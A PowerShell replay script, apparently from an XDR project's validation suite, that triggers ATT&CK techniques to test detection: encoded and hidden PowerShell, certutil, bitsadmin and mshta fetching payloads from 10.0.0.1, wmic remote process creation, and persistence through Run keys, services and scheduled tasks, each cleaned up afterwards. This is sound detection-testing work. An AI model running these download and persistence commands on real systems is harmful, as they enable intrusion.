# OpenXDR Windows 实机回放（安全子集，全部可逆/无破坏）
# 用法：agent + server 在线时，以管理员身份执行：
#   powershell -NoProfile -ExecutionPolicy Bypass -File validation/replay/windows.ps1
# 排除项（有意不做）：T1490 删卷影（破坏性）、凭据转储（杀毒必拦，测不出采集）、清日志
# 注意：persistwatch 快照间隔 30s，持久化点的建/删之间必须留 45s 让 diff 看到中间态
$ErrorActionPreference = 'Continue'
function Mark($n) { Write-Host "=== [$n] $(Get-Date -Format HH:mm:ss) ===" }

Mark 'T1082 systeminfo'
systeminfo | Out-Null

Mark '良性对照: tasklist|findstr lsass（不应告警）'
cmd.exe /c "tasklist | findstr lsass"

Mark 'T1059.001 powershell -enc（故意截断的 base64，进程起来即可）'
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA

Mark 'T1059.001 powershell -NoP -W Hidden -File（文件不存在，进程起来即可）'
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File evil.ps1

Mark 'T1105 certutil urlcache（连 10.0.0.1 失败，无害）'
certutil.exe -urlcache -split -f http://10.0.0.1/evil.exe C:\Windows\Temp\evil.exe
Remove-Item C:\Windows\Temp\evil.exe -Force -ErrorAction SilentlyContinue

Mark 'T1105 bitsadmin（同上，任务随后取消）'
bitsadmin /transfer atomic /download http://10.0.0.1/evil.exe C:\Temp\evil.exe
bitsadmin /cancel atomic 2>$null
Remove-Item C:\Temp\evil.exe -Force -ErrorAction SilentlyContinue

Mark 'T1047 wmic 远程创建进程（连不上，无害）'
wmic /node:10.0.0.8 process call create "cmd.exe /c evil.exe"

Mark 'T1218.005 mshta 远程 hta（5s 后强杀防挂窗）'
$p = Start-Process mshta.exe -ArgumentList 'http://10.0.0.1/payload.hta' -PassThru
Start-Sleep 5
Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue

Mark 'RDCW 文件监控: drivers\etc 增改删'
$f = "C:\Windows\System32\drivers\etc\atomic-test.txt"
New-Item -Path $f -ItemType File -Force | Out-Null
Add-Content $f "x"
Start-Sleep 3
Remove-Item $f -Force

Mark '持久化点建立：Startup lnk / Tasks 文件 / Run 键 / 服务 / 计划任务'
$lnk = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\evil.lnk"
New-Item -Path $lnk -ItemType File -Force | Out-Null
$tf = "C:\Windows\System32\Tasks\atomic"
New-Item -Path $tf -ItemType File -Force | Out-Null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Atomic /t REG_SZ /d "C:\evil.exe" /f
sc.exe create atomic binPath= "C:\evil.exe"
schtasks /create /tn atomic /tr "C:\evil.exe" /sc onstart /f

Mark '等 45s 让 persistwatch 快照 diff 看到中间态'
Start-Sleep 45

Mark 'T1070 删除全部持久化点（删除事件应带旧值）'
Remove-Item $lnk -Force
Remove-Item $tf -Force
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Atomic /f
sc.exe delete atomic
schtasks /delete /tn atomic /f

Mark '回放完成'
